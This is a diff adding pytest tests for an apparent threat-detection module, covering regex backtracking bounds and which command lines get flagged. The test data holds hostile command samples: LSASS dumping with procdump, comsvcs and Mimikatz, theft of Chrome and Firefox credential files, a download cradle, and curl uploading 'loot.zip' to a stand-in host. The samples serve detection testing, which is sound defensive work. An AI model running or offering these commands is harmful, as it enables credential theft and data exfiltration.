@@ -222,3 +222,170 @@ def test_double_extension_matches_uppercase():
     assert rx.search("invoice.pdf.EXE")
     assert rx.search("Report.doc.Scr")
     assert not rx.search("report.pdf")
+
+
+# ── Backtracking bounds (shipped config/threat_detection.yaml) ───────────────
+
+
+def _tags(event: dict) -> set[str]:
+    from app.threat_detection import compute_threat_detection
+
+    res = compute_threat_detection([[event]])
+    return {i["tag"] for cat in res["categories"].values() for i in cat["indicators"]}
+
+
+def _run_within(budget_s: float, fn, *args):
+    """Run ``fn`` and fail the test if it is still running after ``budget_s``.
+
+    sre polls for signals while backtracking, so SIGALRM interrupts a runaway
+    search instead of letting the test hang for minutes.
+    """
+    import signal
+    import time
+
+    class _Budget(Exception):
+        pass
+
+    def _alarm(*_):
+        raise _Budget
+
+    old = signal.signal(signal.SIGALRM, _alarm)
+    signal.setitimer(signal.ITIMER_REAL, budget_s)
+    start = time.perf_counter()
+    try:
+        return fn(*args)
+    except _Budget:
+        pytest.fail(f"still matching after {time.perf_counter() - start:.2f}s (budget {budget_s}s)")
+    finally:
+        signal.setitimer(signal.ITIMER_REAL, 0)
+        signal.signal(signal.SIGALRM, old)
+
+
+_N = 32 * 1024
+
+# Each value repeats a pattern's leading literal (or pads a quantified run)
+# without ever completing the match. With unbounded `X.*Y` gaps sre re-scans
+# the rest of the line from every X, which is quadratic, and cubic for the
+# three-literal patterns: `[char]` + 1000 digits x2 took ~4.5s and
+# `rundll32 comsvcs ` x300 ~5s against the unbounded patterns.
+_ADVERSARIAL = {
+    "char_array_digits_small": "[char]" + "1" * 1000 + "[char]" + "1" * 1000,
+    "char_array_digits": "[char]" + "1" * (_N // 2) + "[char]" + "1" * (_N // 2),
+    "char_array_spaces": "[char]1" + " " * _N + "[char]1",
+    "lsass_rundll_comsvcs_small": "rundll32 comsvcs " * 300,
+    "lsass_rundll_comsvcs": "rundll32 comsvcs " * (_N // 17),
+    "lsass_procdump": "procdump " * (_N // 9),
+    "lsass_openprocess": "OpenProcess " * (_N // 12),
+    "browser_appdata": "AppData\\" * (_N // 8),
+    "browser_mozilla": "Mozilla/" * (_N // 8),
+    "amsi_preferred_ui": "SetPreferredUILanguages " * (_N // 24),
+    "etw_ntdll": "ntdll EventWrite " * (_N // 17),
+    "timestomp_filename": "$FileName " * (_N // 10),
+    "invoke_webrequest": "Invoke-WebRequest " * (_N // 18),
+    "curl_repeat": "curl " * (_N // 5),
+    "curl_spaces": "curl" + " " * _N + "x",
+    "copy_repeat": "copy " * (_N // 5),
+    "copy_spaces": "copy" + " " * _N + "x",
+    "python_c_spaces": "python -c" + " " * _N + "x",
+    "oversized_value": "procdump " * (_N * 4 // 9),
+}
+
+
+@pytest.mark.parametrize("value", list(_ADVERSARIAL.values()), ids=list(_ADVERSARIAL))
+def test_regex_checks_do_not_backtrack_polynomially(value):
+    """A crafted field value must not stall the analytics worker (ReDoS)."""
+    _run_within(2.0, _tags, {"CommandLine": value, "ScriptBlockText": value})
+
+
+@pytest.mark.parametrize(
+    "value,tag",
+    [
+        ("powershell -c iex(([char]73+[char]69+[char]88) -join '')", "CHAR_ARRAY_OBFUSCATION"),
+        ("$s = [char] 105 + [char]101 + [char] 120", "CHAR_ARRAY_OBFUSCATION"),
+        ("procdump.exe -accepteula -ma lsass.exe C:\\temp\\out.dmp", "LSASS_ACCESS"),
+        (
+            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\x.bin full",
+            "LSASS_ACCESS",
+        ),
+        ("Invoke-Mimikatz -Command sekurlsa::logonpasswords", "LSASS_ACCESS"),
+        ("OpenProcess(0x1410, false, lsass_pid)", "LSASS_ACCESS"),
+        ("procdump64 -ma lsass", "CREDENTIAL_TOOLS"),
+        (
+            "copy C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data x",
+            "BROWSER_CREDENTIALS",
+        ),
+        (
+            "type C:\\Users\\bob\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ab.default\\logins.json",
+            "BROWSER_CREDENTIALS",
+        ),
+        ("[Runtime.InteropServices.Marshal]::SetPreferredUILanguages; kernel32", "AMSI_BYPASS"),
+        ("$p = GetProcAddress(ntdll, 'EtwEventWrite')", "ETW_PATCHING"),
+        ("$FileName attribute Modified to 2019-01-01", "TIMESTOMPING"),
+        ("Invoke-WebRequest -OutFile a.exe -Uri http://x.example/a.exe", "DOWNLOAD_CRADLE"),
+        ("curl.exe -s -H 'A: b' -X POST https://x.example/u", "UPLOAD_INDICATOR"),
+        ("curl -k --data @loot.zip https://x.example/u", "UPLOAD_INDICATOR"),
+        ("Invoke-WebRequest -Uri https://x.example -Method Post -InFile a", "UPLOAD_INDICATOR"),
+        ("robocopy C:\\data \\\\fileserver\\share /E", "NETWORK_COPY"),
+        ("cmd /c copy secrets.txt \\\\10.0.0.5\\c$\\tmp", "NETWORK_COPY"),
+    ],
+)
+def test_bounded_regexes_still_match_malicious_samples(value, tag):
+    assert tag in _tags({"CommandLine": value})
+
+
+@pytest.mark.parametrize(
+    "value,tag",
+    [
+        ("powershell -c Write-Host [char]65", "CHAR_ARRAY_OBFUSCATION"),
+        ("rundll32.exe shell32.dll,Control_RunDLL desk.cpl", "LSASS_ACCESS"),
+        ("procdump -ma notepad.exe", "LSASS_ACCESS"),
+        ("copy a.txt b.txt", "NETWORK_COPY"),
+        ("curl https://example.com/health", "UPLOAD_INDICATOR"),
+        ("Invoke-WebRequest https://example.com", "DOWNLOAD_CRADLE"),
+    ],
+)
+def test_bounded_regexes_skip_benign_samples(value, tag):
+    assert tag not in _tags({"CommandLine": value})
+
+
+def test_full_fields_and_long_gaps_are_still_scanned():
+    assert "LSASS_ACCESS" in _tags({"CommandLine": "procdump" + " " * 300 + "lsass"})
+    assert "BASE64_FROMBASE64" in _tags({"CommandLine": "x" * 40000 + " FromBase64String"})
+
+
+def test_regex_work_is_bounded_across_events_and_other_checks_continue(monkeypatch):
+    import time
+
+    import app.threat_detection as td
+
+    monkeypatch.setattr(td, "REGEX_TOTAL_SECONDS", 0.06)
+    monkeypatch.setattr(
+        td,
+        "_cached",
+        td._compile_config(
+            {
+                "categories": {
+                    "test": {
+                        "label": "Test",
+                        "checks": [
+                            {"type": "regex", "fields": ["CommandLine"], "patterns": [{"name": "slow", "pattern": "(a+)+$"}]},
+                            {"type": "keyword_in_value", "name": "marker", "fields": ["CommandLine"], "values": ["marker"]},
+                        ],
+                    }
+                }
+            }
+        ),
+    )
+    acc = td.ThreatAccumulator()
+    started = time.monotonic()
+    for _ in range(100):
+        acc.add([{"CommandLine": "a" * 30000 + "! marker"}])
+    result = acc.result()
+    assert time.monotonic() - started < 1
+    assert result["incomplete"] and result["regex_budget_exhausted"]
+    assert result["regex_timeouts"] > 0
+    assert result["categories"]["test"]["indicators"][0]["count"] == 100
+    fresh = td.ThreatAccumulator()
+    fresh.add([{"CommandLine": "aaa"}])
+    assert not fresh.result().get("incomplete")
+    assert fresh.result()["total_indicators"] == 1
